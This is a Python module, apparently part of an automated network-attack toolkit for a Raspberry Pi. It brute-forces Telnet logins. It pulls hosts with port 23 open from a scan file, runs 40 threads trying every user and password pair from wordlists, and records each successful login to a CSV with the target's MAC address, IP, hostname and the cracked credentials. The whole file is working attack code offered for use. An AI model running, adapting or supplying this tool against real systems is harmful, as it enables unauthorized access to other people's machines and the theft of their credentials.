"""
telnet_connector.py - This script performs a brute-force attack on Telnet servers using a list of credentials,
and logs the successful login attempts.
"""

import os
import csv
import telnetlib
import threading
import logging
import time
from queue import Queue
from shared import SharedData
from logger import Logger

# Configure the logger
logger = Logger(name="telnet_connector.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "TelnetBruteforce"
b_module = "telnet_connector"
b_status = "brute_force_telnet"
b_port = 23
b_parent = None

class TelnetBruteforce:
    """
    Class to handle the brute-force attack process for Telnet servers.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.telnet_connector = TelnetConnector(shared_data)
        logger.info("TelnetConnector initialized.")

    def bruteforce_telnet(self, ip, port):
        """
        Perform brute-force attack on a Telnet server.
        """
        return self.telnet_connector.run_bruteforce(ip, port)

    def execute(self, ip, port, row, status_key):
        """
        Execute the brute-force attack.
        """
        self.shared_data.bjornorch_status = "TelnetBruteforce"
        success, results = self.bruteforce_telnet(ip, port)
        return 'success' if success else 'failed'

class TelnetConnector:
    """
    Class to handle Telnet connections and credential testing.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.scan = self._load_csv_filtered(shared_data.netkbfile, "23")

        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.lock = threading.Lock()
        self.telnetfile = shared_data.telnetfile
        # If the file does not exist, it will be created
        if not os.path.exists(self.telnetfile):
            logger.info(f"File {self.telnetfile} does not exist. Creating...")
            with open(self.telnetfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        self.results = []  # List to store results temporarily
        self.queue = Queue()
        self.progress_lock = threading.Lock()
        self.progress_count = 0
        self.progress_total = 0

    def _load_csv_filtered(self, filepath, port_filter):
        """Load CSV and filter rows containing the specified port."""
        rows = []
        if os.path.exists(filepath):
            with open(filepath, 'r', newline='') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    ports = row.get("Ports", "")
                    if ports and port_filter in ports:
                        rows.append(row)
        return rows

    def load_scan_file(self):
        """
        Load the netkb file and filter it for Telnet ports.
        """
        self.scan = self._load_csv_filtered(self.shared_data.netkbfile, "23")

    def telnet_connect(self, adresse_ip, user, password):
        """
        Establish a Telnet connection and try to log in with the provided credentials.
        """
        try:
            tn = telnetlib.Telnet(adresse_ip)
            tn.read_until(b"login: ", timeout=5)
            tn.write(user.encode('ascii') + b"\n")
            if password:
                tn.read_until(b"Password: ", timeout=5)
                tn.write(password.encode('ascii') + b"\n")

            # Wait to see if the login was successful
            time.sleep(2)
            response = tn.expect([b"Login incorrect", b"Password: ", b"$ ", b"# "], timeout=5)
            tn.close()

            # Check if the login was successful
            if response[0] == 2 or response[0] == 3:
                return True
        except Exception as e:
            pass
        return False

    def worker(self, success_flag):
        """
        Worker thread to process items in the queue.
        """
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break

            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
            if self.telnet_connect(adresse_ip, user, password):
                with self.lock:
                    self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                    logger.success(f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}")
                    self.save_results()
                    self.removeduplicates()
                    success_flag[0] = True
            self.queue.task_done()
            with self.progress_lock:
                self.progress_count += 1
                if self.progress_count % 50 == 0:
                    logger.info(f"Bruteforcing Telnet... {self.progress_count}/{self.progress_total}")

    def run_bruteforce(self, adresse_ip, port):
        self.load_scan_file()  # Reload the scan file to get the latest IPs and ports

        # Find the row for this IP
        mac_address = ""
        hostname = ""
        for row in self.scan:
            if row.get('IPs') == adresse_ip:
                mac_address = row.get('MAC Address', '')
                hostname = row.get('Hostnames', '')
                break

        total_tasks = len(self.users) * len(self.passwords)
        self.progress_total = total_tasks
        self.progress_count = 0

        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                    return False, []
                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

        success_flag = [False]
        threads = []

        logger.info(f"Bruteforcing Telnet on {adresse_ip}... (0/{total_tasks})")

        for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
            t = threading.Thread(target=self.worker, args=(success_flag,))
            t.start()
            threads.append(t)

        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping bruteforce.")
                while not self.queue.empty():
                    self.queue.get()
                    self.queue.task_done()
                break

        self.queue.join()

        for t in threads:
            t.join()

        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful

    def save_results(self):
        """
        Save the results of successful login attempts to a CSV file.
        """
        with open(self.telnetfile, 'a', newline='') as f:
            writer = csv.writer(f)
            for row in self.results:
                writer.writerow(row)
        self.results = []  # Reset temporary results after saving

    def removeduplicates(self):
        """
        Remove duplicate entries from the results file.
        """
        rows = []
        header = None
        if os.path.exists(self.telnetfile):
            with open(self.telnetfile, 'r', newline='') as f:
                reader = csv.reader(f)
                header = next(reader, None)
                seen = set()
                for row in reader:
                    key = tuple(row)
                    if key not in seen:
                        seen.add(key)
                        rows.append(row)

        with open(self.telnetfile, 'w', newline='') as f:
            writer = csv.writer(f)
            if header:
                writer.writerow(header)
            writer.writerows(rows)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        telnet_bruteforce = TelnetBruteforce(shared_data)
        logger.info("Starting Telnet brute-force attack on port 23...")

        # Load the netkb file and get the IPs to scan
        ips_to_scan = shared_data.read_data()

        # Execute the brute-force attack on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            logger.info(f"Executing TelnetBruteforce on {ip}...")
            telnet_bruteforce.execute(ip, b_port, row, b_status)

        logger.info(f"Total number of successes: {len(telnet_bruteforce.telnet_connector.results)}")
        exit(len(telnet_bruteforce.telnet_connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
